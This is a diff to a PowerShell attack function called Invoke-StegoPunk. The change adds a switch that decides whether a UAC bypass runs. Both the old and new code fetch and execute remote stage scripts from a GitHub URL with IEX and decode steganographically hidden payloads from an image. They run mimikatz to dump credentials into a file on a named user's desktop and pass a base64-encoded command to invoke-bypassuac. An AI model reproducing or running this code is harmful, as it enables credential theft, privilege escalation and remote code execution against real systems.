@@ -89,19 +89,33 @@ function Invoke-StegoPunk {
         else
           {
           
-            $stage2 = New-Object System.Net.WebCLient
-            $proxy = New-Object System.Net.webproxy
-            $stage2.proxy = $proxy
-            $stage2.usedefaultcredentials = "true"
-            IEX $stage2.Downloadstring('https://raw.githubusercontent.com/Tru5tNo1/Cyberwar/master/Invoke-AES2Stage.ps1')
-            $base2 = Invoke-AES2Stage -imageurl $imageurl
-            iex ($base2)
-            $cmd = '$stage2 = New-Object System.Net.WebCLient;$proxy = New-Object System.Net.webproxy; $stage2.proxy = $proxy; $stage2.usedefaultcredentials = "true"; IEx $stage2.Downloadstring("https://raw.githubusercontent.com/Tru5tNo1/Cyberwar/master/Invoke-AES1Stage.ps1");$base1 = Invoke-AES1Stage -imageurl $imageurl; iex ($base1); invoke-mimikatz -dumpcreds > c:\users\v.delaurentis\desktop\vito.txt'
-            $ubytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
-            $encodedcmd = [Convert]::ToBase64String($ubytes) 
-            write-Host `n$encodedcmd
-            write-Host "Powershell.exe $cmd"
-            invoke-bypassuac -command "Powershell.exe -EncodedCommand $encodedcmd"
+           if ($b_uac -eq "on")
+                {
+                $stage2 = New-Object System.Net.WebCLient
+                $proxy = New-Object System.Net.webproxy
+                $stage2.proxy = $proxy
+                $stage2.usedefaultcredentials = "true"
+                IEX $stage2.Downloadstring('https://raw.githubusercontent.com/Tru5tNo1/Cyberwar/master/Invoke-AES2Stage.ps1')
+                $base2 = Invoke-AES2Stage -imageurl $imageurl
+                iex ($base2)
+                $cmd = '$stage2 = New-Object System.Net.WebCLient;$proxy = New-Object System.Net.webproxy; $stage2.proxy = $proxy; $stage2.usedefaultcredentials = "true"; IEx $stage2.Downloadstring("https://raw.githubusercontent.com/Tru5tNo1/Cyberwar/master/Invoke-AES1Stage.ps1");$base1 = Invoke-AES1Stage -imageurl $imageurl; iex ($base1); invoke-mimikatz -dumpcreds > c:\users\v.delaurentis\desktop\vito.txt'
+                $ubytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
+                $encodedcmd = [Convert]::ToBase64String($ubytes) 
+                write-Host `n$encodedcmd
+                write-Host "Powershell.exe $cmd"
+                invoke-bypassuac -command "Powershell.exe -EncodedCommand $encodedcmd"
+                }
+                else
+                {
+                $stage2 = New-Object System.Net.WebCLient
+                $proxy = New-Object System.Net.webproxy
+                $stage2.proxy = $proxy
+                $stage2.usedefaultcredentials = "true"
+                IEx $stage2.Downloadstring("https://raw.githubusercontent.com/Tru5tNo1/Cyberwar/master/Invoke-AES1Stage.ps1")
+                $base1 = Invoke-AES1Stage -imageurl $imageurl
+                iex ($base1)
+                invoke-mimikatz -dumpcreds > c:\users\v.delaurentis\desktop\vito.txt
+                }
           }
          
 }
